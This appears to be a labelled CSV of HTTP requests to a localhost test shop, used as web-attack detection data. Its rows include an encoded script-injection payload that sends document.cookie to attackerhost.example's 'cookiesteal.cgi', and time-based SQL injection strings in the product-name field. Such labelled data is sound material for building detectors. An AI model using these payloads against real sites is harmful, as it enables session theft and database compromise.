index,method,url,protocol,userAgent,pragma,cacheControl,accept,acceptEncoding,acceptCharset,acceptLanguage,host,connection,contentLength,contentType,cookie,payload,label
17652,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,794,application/x-www-form-urlencoded,JSESSIONID=708123E76850CB8FB5348C95354BDDED,ciudad=Santa+Mar%EDa+del+Campo,anom
17652,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,794,application/x-www-form-urlencoded,JSESSIONID=708123E76850CB8FB5348C95354BDDED,cp=37799,anom
17652,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,794,application/x-www-form-urlencoded,JSESSIONID=708123E76850CB8FB5348C95354BDDED,provincia=Guip%FAzcoa,anom
17652,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,794,application/x-www-form-urlencoded,JSESSIONID=708123E76850CB8FB5348C95354BDDED,ntc=7225503752888118,anom
17652,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,794,application/x-www-form-urlencoded,JSESSIONID=708123E76850CB8FB5348C95354BDDED,B1=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,modo=registro,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,login=sha-wen,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,password=aeronato,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,nombre=Rudy,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,apellidos=Riviere,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,email=pilato0%40lettere.aero,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,dni=68312371W,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,direccion=Pl.+Ochavo+19+,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,ciudad=Santa+Mar%EDa+del+Campo,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,cp=4653A,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,provincia=Guip%FAzcoa,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,ntc=7225503752888118,anom
17653,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,239,application/x-www-form-urlencoded,JSESSIONID=6B47D257AEA46E2340262C562DB39F42,B1=Registrar,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,modo=registro,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,login=sha-wen,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,password=aeronato,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,nombre=Rudy,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,apellidos=Riviere,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,emailA=pilato0%40lettere.aero,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,dni=68312371W,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,direccion=Pl.+Ochavo+19+,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,ciudad=Santa+Mar%EDa+del+Campo,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,cp=37799,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,provincia=Guip%FAzcoa,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,ntc=7225503752888118,anom
17654,POST,http://localhost:8080/tienda1/miembros/editar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,240,application/x-www-form-urlencoded,JSESSIONID=A59E58ED9DDB92FD33E2E520A158F0FC,B1=Registrar,anom
17655,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,129,application/x-www-form-urlencoded,JSESSIONID=7DEA23EDC12CBDC996AF8087D0E67FD4,id=1,anom
17655,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,129,application/x-www-form-urlencoded,JSESSIONID=7DEA23EDC12CBDC996AF8087D0E67FD4,nombre=Jam%F3n+Ib%E9rico%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anom
17655,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,129,application/x-www-form-urlencoded,JSESSIONID=7DEA23EDC12CBDC996AF8087D0E67FD4,precio=100,anom
17655,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,129,application/x-www-form-urlencoded,JSESSIONID=7DEA23EDC12CBDC996AF8087D0E67FD4,cantidad=28,anom
17655,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,129,application/x-www-form-urlencoded,JSESSIONID=7DEA23EDC12CBDC996AF8087D0E67FD4,B1=A%F1adir+al+carrito,anom
17656,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,112,application/x-www-form-urlencoded,JSESSIONID=A334E1F78821C74C8E5C70FFB7797620,id=1,anom
17656,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,112,application/x-www-form-urlencoded,JSESSIONID=A334E1F78821C74C8E5C70FFB7797620,nombre=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,anom
17656,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,112,application/x-www-form-urlencoded,JSESSIONID=A334E1F78821C74C8E5C70FFB7797620,precio=100,anom
17656,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,112,application/x-www-form-urlencoded,JSESSIONID=A334E1F78821C74C8E5C70FFB7797620,cantidad=28,anom
17656,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,112,application/x-www-form-urlencoded,JSESSIONID=A334E1F78821C74C8E5C70FFB7797620,B1=A%F1adir+al+carrito,anom
17657,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,77,application/x-www-form-urlencoded,JSESSIONID=910C599AC6C0EAB1802D1AFF25B21237,id=1,anom
17657,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,77,application/x-www-form-urlencoded,JSESSIONID=910C599AC6C0EAB1802D1AFF25B21237,nombre=Jam%F3n+Ib%E9rico,anom
17657,POST,http://localhost:8080/tienda1/publico/anadir.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.6.4 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5,text/out","x-gzip, x-deflate, gzip, deflate, compress","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,77,application/x-www-form-urlencoded,JSESSIONID=910C599AC6C0EAB1802D1AFF25B21237,precio=39%2F,anom
